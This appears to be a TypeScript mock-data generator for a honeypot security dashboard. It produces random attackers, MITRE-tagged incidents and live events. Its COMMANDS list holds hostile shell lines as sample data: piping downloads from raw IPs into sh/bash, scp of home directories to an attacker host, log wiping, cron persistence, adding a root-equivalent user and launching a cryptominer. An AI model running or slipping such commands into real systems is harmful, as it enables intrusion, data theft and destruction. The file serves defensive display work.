import type {
  Severity,
  Incident,
  Attacker,
  AIModelStatus,
  HardwareStatus,
  GuardianConfig,
  LiveEvent,
  MitreTactic,
  CategoryCount,
  GuardianState,
  AttackerEvent,
  CredentialAttempt,
  SessionRecord,
} from "./types";

const rnd = (n: number) => Math.floor(Math.random() * n);
const pick = <T,>(arr: T[]): T => arr[rnd(arr.length)];
const chance = (p: number) => Math.random() < p;

const COUNTRIES = [
  { name: "Russia", code: "RU", flag: "🇷🇺", w: 18 },
  { name: "China", code: "CN", flag: "🇨🇳", w: 18 },
  { name: "United States", code: "US", flag: "🇺🇸", w: 10 },
  { name: "Brazil", code: "BR", flag: "🇧🇷", w: 8 },
  { name: "India", code: "IN", flag: "🇮🇳", w: 8 },
  { name: "Netherlands", code: "NL", flag: "🇳🇱", w: 6 },
  { name: "Germany", code: "DE", flag: "🇩🇪", w: 5 },
  { name: "Vietnam", code: "VN", flag: "🇻🇳", w: 5 },
  { name: "Iran", code: "IR", flag: "🇮🇷", w: 5 },
  { name: "North Korea", code: "KP", flag: "🇰🇵", w: 4 },
  { name: "Ukraine", code: "UA", flag: "🇺🇦", w: 4 },
  { name: "Romania", code: "RO", flag: "🇷🇴", w: 4 },
  { name: "Indonesia", code: "ID", flag: "🇮🇩", w: 4 },
  { name: "France", code: "FR", flag: "🇫🇷", w: 3 },
  { name: "South Korea", code: "KR", flag: "🇰🇷", w: 3 },
  { name: "Turkey", code: "TR", flag: "🇹🇷", w: 3 },
];

const THREAT_CLASSES = [
  "SSH Brute Force",
  "C2 Beacon",
  "Data Exfiltration",
  "Lateral Movement",
  "Privilege Escalation",
  "Credential Access",
  "Web Shell Upload",
  "Cryptominer Drop",
  "Reconnaissance Scan",
  "Persistence Implant",
  "Ransomware Stager",
  "Botnet Recruitment",
];

const ATTACK_CATEGORIES = [
  "SSH Brute Force",
  "C2 / Beaconing",
  "Persistence",
  "Exfiltration",
  "Lateral Movement",
  "Privilege Escalation",
  "Reconnaissance",
  "Malware Drop",
];

const MITRE: { tactic: string; tacticId: string; techId: string; tech: string }[] = [
  { tactic: "Reconnaissance", tacticId: "TA0043", techId: "T1595", tech: "Active Scanning" },
  { tactic: "Reconnaissance", tacticId: "TA0043", techId: "T1592", tech: "Gather Victim Host Information" },
  { tactic: "Initial Access", tacticId: "TA0001", techId: "T1190", tech: "Exploit Public-Facing Application" },
  { tactic: "Initial Access", tacticId: "TA0001", techId: "T1133", tech: "External Remote Services" },
  { tactic: "Execution", tacticId: "TA0002", techId: "T1059", tech: "Command and Scripting Interpreter" },
  { tactic: "Execution", tacticId: "TA0002", techId: "T1203", tech: "Exploitation for Client Execution" },
  { tactic: "Persistence", tacticId: "TA0003", techId: "T1098", tech: "Account Manipulation" },
  { tactic: "Persistence", tacticId: "TA0003", techId: "T1543", tech: "Create or Modify System Process" },
  { tactic: "Persistence", tacticId: "TA0003", techId: "T1053", tech: "Scheduled Task/Job" },
  { tactic: "Privilege Escalation", tacticId: "TA0004", techId: "T1068", tech: "Exploitation for Privilege Escalation" },
  { tactic: "Privilege Escalation", tacticId: "TA0004", techId: "T1548", tech: "Abuse Elevation Control Mechanism" },
  { tactic: "Defense Evasion", tacticId: "TA0005", techId: "T1070", tech: "Indicator Removal" },
  { tactic: "Defense Evasion", tacticId: "TA0005", techId: "T1027", tech: "Obfuscated Files or Information" },
  { tactic: "Credential Access", tacticId: "TA0006", techId: "T1110", tech: "Brute Force" },
  { tactic: "Credential Access", tacticId: "TA0006", techId: "T1003", tech: "OS Credential Dumping" },
  { tactic: "Discovery", tacticId: "TA0007", techId: "T1082", tech: "System Information Discovery" },
  { tactic: "Discovery", tacticId: "TA0007", techId: "T1018", tech: "Remote System Discovery" },
  { tactic: "Lateral Movement", tacticId: "TA0008", techId: "T1021", tech: "Remote Services" },
  { tactic: "Collection", tacticId: "TA0009", techId: "T1005", tech: "Data from Local System" },
  { tactic: "Command and Control", tacticId: "TA0011", techId: "T1071", tech: "Application Layer Protocol" },
  { tactic: "Command and Control", tacticId: "TA0011", techId: "T1105", tech: "Ingress Tool Transfer" },
  { tactic: "Exfiltration", tacticId: "TA0010", techId: "T1041", tech: "Exfiltration Over C2 Channel" },
  { tactic: "Impact", tacticId: "TA0040", techId: "T1486", tech: "Data Encrypted for Impact" },
  { tactic: "Impact", tacticId: "TA0040", techId: "T1496", tech: "Resource Hijacking" },
];

const COMMANDS = [
  "uname -a",
  "cat /etc/passwd",
  "wget http://185.220.101.4/x.sh -O- | sh",
  "curl -s http://45.155.205.233/m | bash",
  "chmod +x /tmp/.x && /tmp/.x",
  "cat /proc/cpuinfo | grep model",
  "crontab -l",
  "echo '* * * * * /tmp/.x' | crontab -",
  "rm -rf /var/log/*",
  "history -c",
  "nohup ./xmrig -o pool.minexmr.com:443 &",
  "scp -r /home/* attacker@45.9.148.2:/loot",
  "iptables -F",
  "useradd -ou 0 -g 0 svc",
  "ssh-keygen -y -f id_rsa",
  "ps aux | grep -i guardian",
  "netstat -tulpn",
  "wget http://193.32.162.45/btc.elf",
  "dd if=/dev/zero of=/swapfile bs=1M count=1024",
  "python3 -c 'import socket;...'",
];

const USERNAMES = ["root", "admin", "ubuntu", "oracle", "pi", "test", "user", "guest", "deploy", "git", "postgres", "ftpuser"];
const PASSWORDS_REDACTED = ["••••••••", "••••••", "•••••••••", "••••", "•••••••"];
const MODELS = ["qwen2.5:1.5b-instruct", "qwen2.5:3b-instruct", "llama3.2:3b", "phi3.5:3.8b"];
const DECISIONS = ["BLOCKED", "ISOLATED", "MONITORED", "THROTTLED", "TARPITTED", "DROPPED"];

const SEVERITIES: Severity[] = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"];
function weightedSeverity(): Severity {
  const r = Math.random();
  if (r < 0.12) return "CRITICAL";
  if (r < 0.34) return "HIGH";
  if (r < 0.62) return "MEDIUM";
  if (r < 0.85) return "LOW";
  return "INFO";
}

function weightedCountry() {
  const total = COUNTRIES.reduce((s, c) => s + c.w, 0);
  let r = Math.random() * total;
  for (const c of COUNTRIES) {
    r -= c.w;
    if (r <= 0) return c;
  }
  return COUNTRIES[0];
}

function randomPublicIp(code: string): string {
  const seeds: Record<string, number[]> = {
    RU: [5, 31, 45, 91, 185], CN: [1, 14, 27, 36, 222], US: [3, 8, 23, 44, 104],
    KP: [175], IR: [2, 5, 91], NL: [45, 80, 185], DE: [5, 78, 88],
  };
  const a = (seeds[code] && pick(seeds[code])) || pick([23, 45, 62, 77, 91, 103, 185, 193, 196, 211]);
  return `${a}.${rnd(255)}.${rnd(255)}.${rnd(254) + 1}`;
}

function isoAgo(ms: number) {
  return new Date(Date.now() - ms).toISOString();
}

const DAY = 86400000;
const MONTH = 30 * DAY;

function makeAttacker(): Attacker {
  const c = weightedCountry();
  const ip = randomPublicIp(c.code);
  const firstMs = rnd(MONTH) + DAY;
  const lastMs = rnd(firstMs);
  const totalHits = 20 + rnd(4000);
  const threatLevel = weightedSeverity();
  const nTypes = 1 + rnd(4);
  const attackTypes = Array.from(new Set(Array.from({ length: nTypes }, () => pick(THREAT_CLASSES))));

  const nEvents = 6 + rnd(30);
  const events: AttackerEvent[] = Array.from({ length: nEvents }, () => ({
    timestamp: isoAgo(lastMs + rnd(firstMs - lastMs)),
    type: pick(attackTypes),
    command: pick(COMMANDS),
    decision: pick(DECISIONS),
    severity: weightedSeverity(),
  })).sort((a, b) => +new Date(b.timestamp) - +new Date(a.timestamp));

  const nCreds = 3 + rnd(12);
  const credentials: CredentialAttempt[] = Array.from({ length: nCreds }, () => ({
    username: pick(USERNAMES),
    password: pick(PASSWORDS_REDACTED),
  }));

  const nSessions = 1 + rnd(6);
  const sessions: SessionRecord[] = Array.from({ length: nSessions }, (_, i) => ({
    id: `sess-${ip.replace(/\./g, "")}-${i}`,
    start: isoAgo(lastMs + rnd(firstMs - lastMs)),
    durationSec: 5 + rnd(3600),
    commands: rnd(40),
  }));

  return {
    ip, country: c.name, countryCode: c.code, flag: c.flag,
    firstSeen: isoAgo(firstMs), lastSeen: isoAgo(lastMs),
    totalHits, threatLevel, attackTypes,
    hassh: Array.from({ length: 32 }, () => "0123456789abcdef"[rnd(16)]).join(""),
    ja4: `t13d${rnd(9)}${rnd(9)}07h2_${Array.from({ length: 12 }, () => "0123456789abcdef"[rnd(16)]).join("")}`,
    events, credentials, sessions,
  };
}

function makeIncident(i: number, attackers: Attacker[]): Incident {
  const m = pick(MITRE);
  const sev = weightedSeverity();
  const attacker = pick(attackers);
  return {
    id: `INC-${10000 + i}`,
    timestamp: isoAgo(rnd(MONTH)),
    severity: sev,
    threatClass: pick(THREAT_CLASSES),
    attackerIp: attacker.ip,
    mitreTechnique: m.techId,
    mitreTechniqueName: m.tech,
    mitreTactic: m.tactic,
    actionTaken: pick(DECISIONS),
    confidenceScore: 55 + rnd(45),
    summary: `${m.tech} attempt from ${attacker.country} — ${pick(["payload staged", "credentials sprayed", "beacon detected", "tooling transferred", "lateral pivot blocked", "exfil channel cut"])}.`,
    model: pick(MODELS),
    latencyMs: 80 + rnd(900),
  };
}

export function makeLiveEvent(attackers: Attacker[]): LiveEvent {
  const a = pick(attackers);
  return {
    id: `EVT-${Date.now()}-${rnd(99999)}`,
    timestamp: new Date().toISOString(),
    attackerIp: a.ip,
    attackType: pick(THREAT_CLASSES),
    category: pick(ATTACK_CATEGORIES),
    commandRun: pick(COMMANDS),
    decision: pick(DECISIONS),
    confidence: 55 + rnd(45),
    model: pick(MODELS),
    latencyMs: 80 + rnd(900),
    severity: weightedSeverity(),
  };
}

export function buildMitre(incidents: Incident[]): MitreTactic[] {
  const counts: Record<string, number> = {};
  for (const inc of incidents) counts[inc.mitreTechnique] = (counts[inc.mitreTechnique] || 0) + 1;
  const byTactic: Record<string, MitreTactic> = {};
  for (const m of MITRE) {
    if (!byTactic[m.tactic]) byTactic[m.tactic] = { id: m.tacticId, name: m.tactic, techniques: [] };
    byTactic[m.tactic].techniques.push({ id: m.techId, name: m.tech, count: counts[m.techId] || 0 });
  }
  const order = [
    "Reconnaissance", "Initial Access", "Execution", "Persistence", "Privilege Escalation",
    "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement", "Collection",
    "Command and Control", "Exfiltration", "Impact",
  ];
  return order.filter((t) => byTactic[t]).map((t) => byTactic[t]);
}

function buildCategories(): CategoryCount[] {
  return ATTACK_CATEGORIES.map((name) => ({ name, count: 40 + rnd(900) })).sort((a, b) => b.count - a.count);
}

export function generateGuardianState(): GuardianState {
  const attackers = Array.from({ length: 64 }, makeAttacker).sort((a, b) => b.totalHits - a.totalHits);
  const incidents = Array.from({ length: 460 }, (_, i) => makeIncident(i, attackers)).sort(
    (a, b) => +new Date(b.timestamp) - +new Date(a.timestamp)
  );

  const aiModel: AIModelStatus = {
    model: "qwen2.5:1.5b-instruct",
    lastResponseMs: 120 + rnd(180),
    successRate: 97 + Math.random() * 2.5,
    failureRate: 0.5 + Math.random() * 2,
    circuitState: "CLOSED",
    prewarm: true,
  };

  const hardware: HardwareStatus = {
    tier: "Guardian Edge",
    ramUsed: 3.4 + Math.random() * 2,
    ramTotal: 8,
    cpuPercent: 18 + rnd(45),
    diskUsed: 42 + rnd(20),
    diskTotal: 256,
    uptimeSec: 86400 * 3 + rnd(86400),
  };

  const config: GuardianConfig = {
    learningMode: false,
    dryRun: false,
    autonomous: true,
    confidenceThreshold: 75,
    modelsLoaded: ["qwen2.5:1.5b-instruct", "qwen2.5:3b-instruct"],
    hardwareTier: "Guardian Edge",
    databasePath: "/var/lib/bifrost/guardian.db",
    logPath: "/var/log/bifrost/guardian.log",
    cowrieLogPath: "/opt/cowrie/var/log/cowrie/cowrie.json",
    ingestPort: 8765,
    dashboardPort: 8766,
    guardianHost: "127.0.0.1",
    tokens: { ingest: true, executor: true, dashboard: true },
  };

  const counters = {
    eventsPerMin: 40 + rnd(120),
    activeAttackers: 6 + rnd(28),
    queueDepth: rnd(14),
    processedToday: 8000 + rnd(20000),
  };

  const liveEvents = Array.from({ length: 30 }, () => makeLiveEvent(attackers)).sort(
    (a, b) => +new Date(b.timestamp) - +new Date(a.timestamp)
  );

  return { incidents, attackers, aiModel, hardware, config, categories: buildCategories(), counters, liveEvents };
}

export { SEVERITIES, ATTACK_CATEGORIES };
